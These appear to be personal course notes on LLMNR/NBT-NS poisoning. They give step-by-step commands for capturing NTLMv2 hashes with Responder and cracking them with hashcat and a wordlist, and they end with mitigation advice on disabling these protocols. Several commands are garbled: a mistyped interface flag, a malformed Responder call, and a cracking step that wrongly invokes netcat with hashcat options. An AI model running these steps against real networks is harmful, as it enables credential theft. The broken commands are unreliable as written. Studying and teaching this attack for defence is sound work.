___
### What is LLMNR?
- Used to identify hosts when DNS fails to do so.
- Previously NBT-NS
- Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to.

### Steps:

- Step1 : Run Responder
```
sudo responder -| tun0 -dwp
```

- Step 2 : An Event Occurs...
- Step 3 : Get Dem Hash
- Step 4 : Crack that Hash
```
hashcat -m 5600 hashes.txt rockyou.txt
```

### Practical:
```
sudo responder -eth0
```

![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251023222322.png)
- We can crack this captured hashes using netcat 
```
netcat -m 5600 hashes.txt rockyou.txt
```

### LLMNR Poisoning Mitigation:
The best defense in this case is to disable LLMNR and NBT-NS.
- To disable LLMNR, select "Turn OFF Multicast Name Resolution" under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in the Group Policy Editor.
- To disable NBT-NS, navigate to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINS tab and select "Disable NetBIOS over TCP/IP".

If a company must use or cannot disable LLMNR/NBT-NS, the best course of action is to:
- Require Network Access Control.
- Require strong user passwords(e.g., >14 characters in length and limit common word usage). The more complex and long the password, the harder it is for an attacker to crack the hash.